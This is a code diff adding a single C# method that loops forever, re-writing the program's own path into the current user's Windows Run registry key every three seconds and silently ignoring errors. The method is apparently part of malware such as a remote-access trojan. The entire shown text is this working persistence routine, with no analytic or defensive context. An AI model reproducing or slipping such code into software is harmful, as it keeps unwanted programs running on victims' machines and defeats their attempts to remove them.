@@ -1,0 +1,16 @@
+private static void startthread()
+        {
+            do
+            {
+                try
+                {
+                    if (!Misc.keyExists(Settings.startupkey))
+                    {
+                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        reg.SetValue(Settings.startupkey, "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
+                    }
+                }
+                catch { } 
+                Thread.Sleep(3000);
+            } while (true);
+        }
